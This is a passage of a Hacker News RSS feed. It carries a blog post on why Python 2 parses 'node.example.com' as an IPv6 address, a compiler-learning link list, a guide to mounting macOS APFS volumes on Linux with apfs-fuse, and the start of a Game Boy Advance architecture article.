</span><span>6
</span></code></pre><img src="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/confused-jeff-bridges.webp" alt="Confused Jeff Bridges">

<p>If, like Jeff Bridges, you were confused by that result, <em>relax</em>. We're
probably not in a <a href="https://en.wikipedia.org/wiki/Bizarro_World">Bizarro World</a> where <code>node.example.com</code> is a valid IPv6
address. There must be an explanation for this behavior.</p>
<p>Things start to become a little more clear when we see the result of the
<a href="https://github.com/python/cpython/blob/v3.9.0/Lib/ipaddress.py#L27-L54"><code>ip_address()</code></a> function for ourselves.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)
IPv6Address(</span><span>u</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'</span><span>)
</span></code></pre>
<p>At first glance that looks like madness. Python 3 behaves in an entirely
different manner.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>try</span><span>:
</span><span>...     </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)
</span><span>... </span><span>except </span><span>ValueError </span><span>as </span><span>error:
</span><span>...     </span><span>print</span><span>(error)
</span><span>... 
</span><span>'node.example.com' </span><span>does </span><span>not </span><span>appear to be an IPv4 </span><span>or </span><span>IPv6 address
</span></code></pre>
<p>Python 3 knows that's not an IPv6 address, so why doesn't Python 2? The answer
is in how differently the two Python versions handle text.</p>

<p>Computers don't operate on text as humans think of it. They operate on numbers.
That's part of why we have IP addresses to begin with. In order to represent
human-readable text with computers we had to assign meaning to the numbers.
Thus, <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a> was born.</p>
<p>ASCII is a <a href="https://en.wikipedia.org/wiki/Character_encoding">character encoding</a>, which means it specifies how to interpret
<a href="https://en.wikipedia.org/wiki/Byte">bytes</a> as text we understand (provided you speak English). So, when your
computer sees <code>01101110</code> in <a href="https://en.wikipedia.org/wiki/Binary_number">binary</a> (<code>110</code> in <a href="https://en.wikipedia.org/wiki/Decimal">decimal</a>) you see <code>n</code> because
that's what ASCII says it is.</p>
<p>You can see the number to text conversion in action right in the Python
interpreter.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ord</span><span>(</span><span>"n"</span><span>)
</span><span>110
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>110</span><span>)
</span><span>'n'
</span></code></pre>
<p>In fact, it doesn't matter what numbering system you use. If you specify
binary, <a href="https://en.wikipedia.org/wiki/Octal">octal</a>, decimal, hexadecimal, whatever... If it can be understood as
the right integer it will be displayed correctly.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0b01101110</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0o156</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>110</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0x6e</span><span>)
</span><span>'n'
</span></code></pre>
<p>Neat, but what does that information do for us?</p>

<p>Just for giggles, humor me and let's look at the character-number translations
for <code>node.example.com</code>. We'll leave out binary and octal, because they make
this table uglier than it already is.</p>
<table>
  <tbody><tr>
    <th>Character</th>
    <td>n</td>
    <td>o</td>
    <td>d</td>
    <td>e</td>
    <td>.</td>
    <td>e</td>
    <td>x</td>
    <td>a</td>
    <td>m</td>
    <td>p</td>
    <td>l</td>
    <td>e</td>
    <td>.</td>
    <td>c</td>
    <td>o</td>
    <td>m</td>
  </tr>
  <tr>
    <th>Decimal</th>
    <td>110</td>
    <td>111</td>
    <td>100</td>
    <td>101</td>
    <td>46</td>
    <td>101</td>
    <td>120</td>
    <td>97</td>
    <td>109</td>
    <td>112</td>
    <td>108</td>
    <td>101</td>
    <td>46</td>
    <td>99</td>
    <td>111</td>
    <td>109</td>
  </tr>
  <tr>
    <th>Hexadecimal</th>
    <td>6e</td>
    <td>6f</td>
    <td>64</td>
    <td>65</td>
    <td>2e</td>
    <td>65</td>
    <td>78</td>
    <td>61</td>
    <td>6d</td>
    <td>70</td>
    <td>6c</td>
    <td>65</td>
    <td>2e</td>
    <td>63</td>
    <td>6f</td>
    <td>6d</td>
  </tr>
</tbody></table>
<p>Hey, hold on a second... If you tilt your head sideways and squint that last
row looks kinda like an IPv6 address, doesn't it?</p>
<p>We should verify, just to be absolutely certain. You've still got that Python 2
interpreter open, right?</p>
<pre><code><span>&gt;&gt;&gt; </span><span># Convert the characters in the hostname to hexadecimal.
</span><span>&gt;&gt;&gt; </span><span>hostname </span><span>= </span><span>"node.example.com"
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal </span><span>= </span><span>""</span><span>.join(</span><span>hex</span><span>(</span><span>ord</span><span>(c))[</span><span>2</span><span>:] </span><span>for </span><span>c </span><span>in </span><span>hostname)
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal
</span><span>'6e6f64652e6578616d706c652e636f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Convert the "IP address" to text.
</span><span>&gt;&gt;&gt; </span><span>address </span><span>= </span><span>ipaddress.ip_address(hostname)
</span><span>&gt;&gt;&gt; </span><span>str</span><span>(address)
</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Remove the colons from that text.
</span><span>&gt;&gt;&gt; </span><span>address_without_colons </span><span>= </span><span>str</span><span>(address).replace(</span><span>":"</span><span>, </span><span>""</span><span>)
</span><span>&gt;&gt;&gt; </span><span>address_without_colons
</span><span>'6e6f64652e6578616d706c652e636f6d'
</span><span>&gt;&gt;&gt;
&gt;&gt;&gt; </span><span># Compare the results and see they're equal.
</span><span>&gt;&gt;&gt; </span><span>hostname_as_hexadecimal </span><span>== </span><span>address_without_colons
</span><span>True
</span></code></pre>
<p>Sure enough, when you boil them both down to numbers they're the same mess of
hexadecimal.</p>

<p>If we dig into the source code for the Python 2 version of the
<a href="https://github.com/phihag/ipaddress/blob/v1.0.23/ipaddress.py"><code>ipaddress</code></a> module we ultimately come to a
<a href="https://github.com/phihag/ipaddress/blob/v1.0.23/ipaddress.py#L2026-L2031">curious set of lines</a>.</p>
<pre><code><span># Constructing from a packed address
</span><span>if </span><span>isinstance</span><span>(address, </span><span>bytes</span><span>)</span><span>:
    </span><span>self._check_packed_address(address, </span><span>16</span><span>)
    </span><span>bvs </span><span>= </span><span>_compat_bytes_to_byte_vals(address)
    self</span><span>._ip </span><span>= </span><span>_compat_int_from_byte_vals(bvs, </span><span>'big'</span><span>)
    </span><span>return
</span></code></pre>
<p>It turns out that, under certain conditions, the <code>ipaddress</code> module can create
IPv6 addresses from raw bytes. My assumption is that it offers this behavior as
a convenient way to parse IP addresses from data fresh off the <a href="https://en.wikipedia.org/wiki/Wire_data">wire</a>.</p>
<p>Does <code>node.example.com</code> meet those certain conditions? You bet it does. Because
we're using Python 2 it's just <code>bytes</code> and it happens to be 16 characters long.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>isinstance</span><span>(</span><span>"node.example.com"</span><span>, </span><span>bytes</span><span>)
</span><span>True
</span><span>&gt;&gt;&gt; </span><span># `self._check_packed_address` basically just checks how long it is.
</span><span>&gt;&gt;&gt; </span><span>len</span><span>(</span><span>"node.example.com"</span><span>) </span><span>== </span><span>16
True
</span></code></pre>
<p>The rest of the <code>ipaddress</code> lines say to interpret the sequence of bytes as a
<a href="https://en.wikipedia.org/wiki/Endianness">big-endian</a> integer. That's <a href="https://docs.python.org/3.9/library/struct.html#struct.unpack">magic</a> best left
for another blog post, but the gist is that hexadecimal interpretation of
<code>node.example.com</code> is condensed into a single, <strong>huge</strong> number.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>int</span><span>(</span><span>"6e6f64652e6578616d706c652e636f6d"</span><span>, </span><span>16</span><span>)
</span><span>146793460745001871434687145741037825901</span><span>L
</span></code></pre>
<p>That's an absolutely massive number, but not so massive it won't fit within the
<a href="https://en.wikipedia.org/wiki/IPv6#Larger_address_space">IPv6 address space</a>.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ip_address(</span><span>146793460745001871434687145741037825901</span><span>L</span><span>)
IPv6Address(</span><span>u</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'</span><span>)
</span></code></pre>
<p>As it turns out, if you're liberal in your interpretation, <code>node.example.com</code>
<em>can</em> be an IPv6 address!</p>

<p>Obviously that's hogwash. Bizarro might be proud, but that's not what we wanted
to happen.</p>
<p>There's a quote about numbers which is apocryphally attributed to <a href="https://en.wikipedia.org/wiki/W._E._B._Du_Bois">W.E.B. Du
Bois</a>, but that actually comes from <a href="https://en.wikipedia.org/wiki/Harold_Geneen">Harold Geneen</a>'s book,
<a href="https://en.wikiquote.org/wiki/Harold_Geneen"><em>Managing</em></a>.</p>
<blockquote>
<p>When you have mastered the numbers, you will in fact no longer be reading
numbers, any more than you read words when reading a book. You will be
reading meanings.</p>
</blockquote>
<p>Having not read the book I'm probably taking the quote way out of context, but
I think it fits our situation well.</p>
<p>As we've seen above, we can freely convert characters to numbers and back
again. The root of our problem is that when we use Python 2 it considers text
to be bytes. There's not a deeper, inherent meaning. Maybe the bytes are meant
to be ASCII, maybe they're meant to be a long number, maybe they're meant to be
an IP address. The interpretation of those bytes is up to us.</p>
<p>Python 2 doesn't differentiate between bytes and text by default. In fact, the
<code>bytes</code> type is just an <a href="https://docs.python.org/3/whatsnew/2.6.html#pep-3112-byte-literals">alias</a> for <code>str</code>.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>bytes
</span><span>&lt;</span><span>type </span><span>'str'</span><span>&gt;
&gt;&gt;&gt; </span><span>bytes </span><span>is </span><span>str
</span><span>True
</span></code></pre>
<p>To make that even more concrete, see how Python 2 considers <code>n</code> to be the same
as this sequence of raw bytes.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>"n" </span><span>== </span><span>b</span><span>"\x6e"
</span><span>True
</span></code></pre>
<p>Our Python 2 code doesn't work the way we want it to because raw bytes can have
arbitrary meaning and we haven't told it to use our intended meaning.</p>
<p>So now we know why Python 2 interprets <code>node.example.com</code> as an IPv6 address,
but why does Python 3 behave differently? More importantly, how can we
reconcile the two?</p>

<p>ASCII looked like a good idea in the 1960's. With decades of hindsight we
know the 256 characters …</p></article></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/">https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/</a></em></p>]]>
            </description>
            <link>https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25565443</guid>
            <pubDate>Tue, 29 Dec 2020 01:12:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner's Guide to Houseplants]]>
            </title>
            <description>
<![CDATA[
Score 101 | Comments 36 (<a href="https://news.ycombinator.com/item?id=25565349">thread link</a>) | @Pjki889
<br/>
December 28, 2020 | https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502 | <a href="https://web.archive.org/web/*/https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/rxhl/A-Beginner-s-Guide-to-Houseplants-f90190a8c15b4bb8b65c60f16e3f9502</link>
            <guid isPermaLink="false">hacker-news-small-sites-25565349</guid>
            <pubDate>Tue, 29 Dec 2020 00:59:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Resources for learning about compilers and LLVM]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25564893">thread link</a>) | @ingve
<br/>
December 28, 2020 | https://www.jessesquires.com/blog/2020/12/28/resources-for-learning-about-compilers-and-llvm/ | <a href="https://web.archive.org/web/*/https://www.jessesquires.com/blog/2020/12/28/resources-for-learning-about-compilers-and-llvm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Today I cleaned up my various projects and todo’s in <a href="https://www.omnigroup.com/omnifocus">OmniFocus</a>. I am always collecting links and resources for potential project ideas, or for general learning. Sometimes, however, it is best to acknowledge that I will likely never have enough free time to even begin some of these endeavors.</p>

<!--excerpt-->

<p>One thing I love about OmniFocus is the concept of “dropping” a project or task, which neither deletes the item nor marks it as complete — a feature sorely lacking in most “Todo” apps. Dropping an item is similar to deletion, but it preserves the record in case you would ever like to return to it. It is removed from view, but you can find it again by searching.</p>

<p>Today I decided to “drop” my compilers project in OmniFocus. I may return to it one day. Maybe not. In any case, I figured others in the community who want to learn about compilers might find these resources valuable. I have only skimmed them, but they should provide a good starting point. I hope you succeed where I did not.</p>

<p>All of these notes (among many others) are also in my <a href="https://github.com/jessesquires/TIL/blob/main/compilers/README.md">TIL repo</a> on GitHub.</p>

<ul>
  <li><a href="https://academy.realm.io/posts/tryswift-samuel-giddins-building-tiny-compiler-swift-ios/">Watch: Building a Tiny Compiler</a>, Samuel Giddins
    <blockquote>
      <p>We all use compilers every day, but they still can seem like a mysterious black box at times. In this try! Swift talk, Samuel Giddins builds a tiny compiler for his made-up language 100% from scratch to get a feel for the basics of how compilers work.</p>
    </blockquote>
  </li>
  <li><a href="https://www.skilled.io/u/playgroundscon/how-to-clang-your-dragon">Watch: How to Clang Your Dragon</a>, Harlan Haskins
    <blockquote>
      <p>We’re going to start by going over the basic structure of a compiler. Then we’re going to build a lexer and a parser for Kaleidoscope. Then we’re going to take that parse data and we’re going to compile it to LLVM Intermediate Representation.</p>
    </blockquote>
  </li>
  <li><a href="http://belkadan.com/blog/2016/05/So-You-Want-To-Be-A-Compiler-Wizard/">So You Want to Be a (Compiler) Wizard</a>, Jordan Rose
    <blockquote>
      <p>These are things you can do on your own. I’ve arranged them roughly in order of difficulty and time commitment, although of course the language / environment you pick will affect things.</p>
    </blockquote>
  </li>
  <li><a href="http://www.llvm.org/docs/tutorial/">LLVM tutorial</a>
    <blockquote>
      <p>This is the “Kaleidoscope” Language tutorial, showing how to implement a simple language using LLVM components in C++.</p>
    </blockquote>
  </li>
  <li><a href="http://www.craftinginterpreters.com/">Crafting interpreters</a>
    <blockquote>
      <p>This book contains everything you need to implement a full-featured, efficient scripting language. You’ll learn both high-level concepts around parsing and semantics and gritty details like bytecode representation and garbage collection. Your brain will light up with new ideas, and your hands will get dirty and calloused. It’s a blast.</p>
    </blockquote>
  </li>
  <li><a href="https://github.com/marciok/Mu">Mu - Swift Playground</a>
    <blockquote>
      <p>It’s a playground explaining how to create a tiny programming language (Mu).</p>
    </blockquote>
  </li>
  <li><a href="https://blog.regehr.org/archives/1453">A Tourist’s Guide to the LLVM Source Code</a>
    <blockquote>
      <p>In my Advanced Compilers course last fall we spent some time poking around in the LLVM source tree. A million lines of C++ is pretty daunting but I found this to be an interesting exercise and at least some of the students agreed, so I thought I’d try to write up something similar. We’ll be using LLVM 3.9, but the layout isn’t that different for previous (and probably subsequent) releases.</p>
    </blockquote>
  </li>
  <li>The <a href="https://www.youtube.com/c/LLVMPROJ/playlists">LLVM conference videos</a> on YouTube.</li>
</ul>

    </div></div>]]>
            </description>
            <link>https://www.jessesquires.com/blog/2020/12/28/resources-for-learning-about-compilers-and-llvm/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564893</guid>
            <pubDate>Tue, 29 Dec 2020 00:00:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Teaching the Unfortunate Parts]]>
            </title>
            <description>
<![CDATA[
Score 102 | Comments 69 (<a href="https://news.ycombinator.com/item?id=25564666">thread link</a>) | @gary_bernhardt
<br/>
December 28, 2020 | https://www.executeprogram.com/blog/teaching-the-unfortunate-parts | <a href="https://web.archive.org/web/*/https://www.executeprogram.com/blog/teaching-the-unfortunate-parts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.executeprogram.com/blog/teaching-the-unfortunate-parts</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564666</guid>
            <pubDate>Mon, 28 Dec 2020 23:37:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to mount macOS APFS disk volumes in Linux]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25564656">thread link</a>) | @doener
<br/>
December 28, 2020 | https://linuxnewbieguide.org/how-to-mount-macos-apfs-disk-volumes-in-linux/ | <a href="https://web.archive.org/web/*/https://linuxnewbieguide.org/how-to-mount-macos-apfs-disk-volumes-in-linux/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div>
			
<div><figure><img loading="lazy" width="700" height="350" src="https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?resize=700%2C350&amp;ssl=1" alt="" srcset="https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?w=700&amp;ssl=1 700w, https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?resize=370%2C185&amp;ssl=1 370w" sizes="(max-width: 700px) 100vw, 700px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?w=700&amp;ssl=1 700w, https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?resize=370%2C185&amp;ssl=1 370w" data-lazy-src="https://i0.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs.jpg?resize=700%2C350&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>APle FileSystem is the new filesystem for mac computers ad iOS devices since 2017.</figcaption></figure></div>



<p>In 2017, Apple changed the default filesystem on their macOS (High Sierra and above) to APFS, he Apple File System. It replaced HFS+.</p>



<p>It works on a principle of using containers, rather than partitions. It has good cloning efficiencies, better encrytion, snapshot support as well as a few other benefits. </p>




<h2><span id="Proprietary_prattle"></span>Proprietary prattle<span></span></h2>



<p>As all things recent in the Apple world, they do not like to share things. Even when this could negatively impact their business. Take FaceTime, for example. If they had made that platform agnostic, meaning that people on Windows, Android and maybe even Linux/Web platforms could use it, then it is arguable that FaceTime would have taken much of the market share from the likes of Skype. APFS is no different. Apple haven’t shared the API, so it relies on people to do an extent of guesswork, detailed research and some reverse engineering. All of which is never a good thing when you are working on the systems that look after the integrity of your files!</p>



<figure><img loading="lazy" width="807" height="234" src="https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=807%2C234&amp;ssl=1" alt="apfs documentation isn't coming any time soon." srcset="https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?w=807&amp;ssl=1 807w, https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=300%2C87&amp;ssl=1 300w, https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=768%2C223&amp;ssl=1 768w, https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=370%2C107&amp;ssl=1 370w" sizes="(max-width: 807px) 100vw, 807px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?w=807&amp;ssl=1 807w, https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=300%2C87&amp;ssl=1 300w, https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=768%2C223&amp;ssl=1 768w, https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=370%2C107&amp;ssl=1 370w" data-lazy-src="https://i2.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/apfs-doc.png?resize=807%2C234&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Apple aren’t going to be documenting or open sourcing APFS any time soon by the looks of it.</figcaption></figure>



<p>For those of you that use Linux on a mac and still have a need to access your files on the Mac partition of your hard drive on occasion then you may find it a challenge. If you have any version of macOS prior ot 10.3 (High Sierra), then your mac will be using HFS<a href="https://linuxnewbieguide.org/how-to-install-linux-on-a-macintosh-computer/">+. Check out our comprehensive guide on using Linux on a mac</a> on how to mount your HFS+ partition as read/write.<span data-ez-name="linuxnewbieguide_org-box-4"></span></p>



<h2><span id="How_do_I_get_it_working"></span>How do I get it working?<span></span></h2>



<p>For the newer APFS users, fortunately, you can now use a driver called <a href="https://github.com/sgan81/apfs-fuse">apfs-fuse </a>to access your mac’s APFS disk. Note that this driver is not part of your Linux distribution and you will have to build it from source code. This short guide will show you how. </p>



<h3><span id="Bummer,_Read_only%E2%80%A6"></span>Bummer, Read only….<span></span></h3>



<p>Unfortunately, at least for now, you are limited to read-only access. The upshot of this is that no data can be damaged by any bugs that may exist in this experimental software. The driver’s associated mount tool will also not perform transparent LZFSE decompression. I have been using this tool for a number of weeks on my ‘Mojave’ macOS computer and it works well.</p>



<h3><span id="Get_tooled_up"></span>Get tooled up<span></span></h3>



<p>Firstly, I’d like to say that this is an entirely newbie friendly tutorial, however on this occasion, it’s all work at the <a href="https://linuxnewbieguide.org/overview-of-chapters/more-advanced-guides/i-dont-know-any-commands/">Terminal</a>. Don’t worry too much if you’re not used to working at the command line, you are safe to copy and paste the instructions.</p>



<p>Firstly, we need to have the appropriate tools in order to build the APFS-Fuse driver. Open your Terminal app and enter these commands:</p>



<pre><code>sudo apt update
sudo apt install libicu-dev bzip2 cmake libz-dev libbz2-dev fuse3 libfuse3-3 libfuse3-dev clang git libattr1-dev

On older versions of Ubuntu, you may need to use the following: sudo apt install fuse libfuse-dev libicu-dev bzip2 cmake libz-dev libbz2-dev clang git libattr1-dev</code></pre>



<p>Now we can download (clone) the driver source code with git:</p>



<pre><code>git clone https://github.com/sgan81/apfs-fuse.git
cd apfs-fuse
git submodule init
git submodule update</code></pre>



<p>After that’s done, it’s time to compile the downloaded source code:</p>



<pre><code>mkdir build
cd build
cmake ..
make</code></pre>



<p>After compilation, the binaries are located in the build directory.  I recommend copying the apfs* tools into a directory that can be accessed in the path, for example /usr/local/bin. To copy them simply do this:</p>



<pre><code>sudo cp apfs-* /usr/local/bin</code></pre>



<p>Now we need to find out which disk partition macOS is on. By using the fdisk -l command you’ll be able to see the layout of the disk. </p>



<pre><code>$sudo fdisk -l
--- 8&gt;--snipped the loop volumes--&lt;8 ---
Disk /dev/sda: 465.9 GiB, 500277790720 bytes, 977105060 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 4096 bytes
I/O size (minimum/optimal): 4096 bytes / 4096 bytes
Disklabel type: gpt
Disk identifier: 6153AD88-FE14-4E88-8D9A-60E8AA465516

Device         Start       End   Sectors   Size Type
/dev/sda1         40    409639    409600   200M EFI System
/dev/sda2     409640 764593231 764183592 364.4G unknown
/dev/sda3  764594176 781570047  16975872   8.1G Microsoft basic data
/dev/sda4  781832192 976842751 195010560    93G Microsoft basic data
--- 8&gt;--snipped the loop volumes--&lt;8 ---</code></pre>



<p>You can see in my example above that there is a 364.4GB unknown partition. I know that this is my macOS partition because I know that the size of my macOS partition is 365GB. This means that the device identifier is /dev/sda2, so that’s what we will mount.</p>



<p>Let’s check it out and see if it works….</p>



<pre><code>sudo mkdir -p /media/$USERNAME/macos
sudo ./apfs-fuse -o allow_other /dev/sda2 /media/&lt;your userame&gt;/macos</code></pre>



<p>Hopefully, all going well, you won’t have received any error messages at this point. If you have, then perhaps the <a href="https://github.com/sgan81/apfs-fuse#apfs-fuse-driver-for-linux">README</a> file can provide some enlightenment. </p>



<div><figure><img loading="lazy" width="707" height="424" src="https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?resize=707%2C424&amp;ssl=1" alt="" srcset="https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?w=707&amp;ssl=1 707w, https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?resize=300%2C180&amp;ssl=1 300w, https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?resize=370%2C222&amp;ssl=1 370w" sizes="(max-width: 707px) 100vw, 707px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?w=707&amp;ssl=1 707w, https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?resize=300%2C180&amp;ssl=1 300w, https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?resize=370%2C222&amp;ssl=1 370w" data-lazy-src="https://i1.wp.com/linuxnewbieguide.org/wp-content/uploads/2019/02/mounted.png?resize=707%2C424&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>You can see that the macos partition is now mounted in the File browser.</figcaption></figure></div>



<h3><span id="Making_it_stick"></span>Making it stick<span></span></h3>



<p><span data-ez-name="linuxnewbieguide_org-medrectangle-4"></span>If you want to have your macos partition automatically mount every time you start up you computer, then you’ll need to edit into your filesystem table (fstab). To do this, we will need to make a symlink to the apfs mount tool, and then edit the fstab (if you don’t have nano, use vim):</p>



<pre><code>sudo ln -s /usr/local/bin/apfs-fuse /usr/sbin/mount.apfs
sudo nano /etc/fstab</code></pre>



<p>Add a line at the bottom of the file (all on one line) that says this:</p>



<pre><code>mount.apfs#/dev/sda2    /media/&lt;your username&gt;/macos/    fuse    user,allow_other        0       0</code></pre>



<p>If you want to see if that works immediately just unmount the disk (see the cleaning up section below). Then type sudo mount -a to mount the disk from the fstab.</p>



<h3><span id="Getting_to_know_your_partition"></span>Getting to know your partition<span></span></h3>



<p>When the partition is mounted, you will see two directories, private-dir and root. The directory root is the one you want. Inside there is the root filesystem of your mac. You’ll find your stuff in the ‘Users’ folder.</p>



<h3><span id="Cleaning_up_(Unmounting)"></span>Cleaning up (Unmounting)<span></span></h3>



<p>To unmount the macos directory properly, you should use the fusermount command:</p>



<pre><code>fusermount -u /media/&lt;your username&gt;/macos</code></pre>



<p>I hope this has helped you get access to your mac’s files. Please share this article and let me know how you get on in the comments section below.</p>

					</div><!-- .entry-content -->
	</div></div>]]>
            </description>
            <link>https://linuxnewbieguide.org/how-to-mount-macos-apfs-disk-volumes-in-linux/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25564656</guid>
            <pubDate>Mon, 28 Dec 2020 23:36:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Architecture of the Game Boy Advance]]>
            </title>
            <description>
<![CDATA[
Score 208 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25564619">thread link</a>) | @biwasa
<br/>
December 28, 2020 | https://www.copetti.org/writings/consoles/game-boy-advance/ | <a href="https://web.archive.org/web/*/https://www.copetti.org/writings/consoles/game-boy-advance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div class="page"><nav id="navbar"></nav><h2>A Practical Analysis</h2><hr><hr><h2 id="a-quick-introduction">A quick introduction</h2><p>The internal design of the Game Boy Advance is quite impressive for a portable console that runs on two AA batteries.</p><p>This console will carry on using Nintendo’s <em>signature</em> GPU. Additionally, it will introduce a relatively new CPU from a UK company that will surge in popularity in years to come.</p><hr><h2 id="cpu">CPU</h2><p>Most of the components are combined into a single package called <strong>CPU AGB</strong>. This package contains two completely different CPUs:</p><ul><li>A <strong>Sharp LR35902</strong> running at either 8.4 or 4.2 MHz: <em>If it isn’t the same CPU found on the Game Boy!</em> It’s effectively used to run Game Boy (<strong>DMG</strong>) and Game Boy Color (<strong>CGB</strong>) games. Here’s <a href="https://www.copetti.org/writings/consoles/game-boy/">my previous article</a> if you want to know more about it.</li><li>An <strong>ARM7TDMI</strong> running at 16.78 MHz: This is the new processor we’ll focus on, it most certainly runs Game Boy Advance games.</li></ul><p>Note that both CPUs will <strong>never run at the same time</strong> or do any fancy co-processing. The <strong>only</strong> reason for including the <em>very</em> old Sharp is for <strong>backwards compatibility</strong>.</p><h4 id="whats-new">What’s new?</h4><p>Before ARM Holdings (currently “Arm”) became incredibly popular in the smartphone world, they licensed their CPU designs to power Acorn’s computers, Apple’s Newton, Nokia’s phones and the Panasonic 3DO.
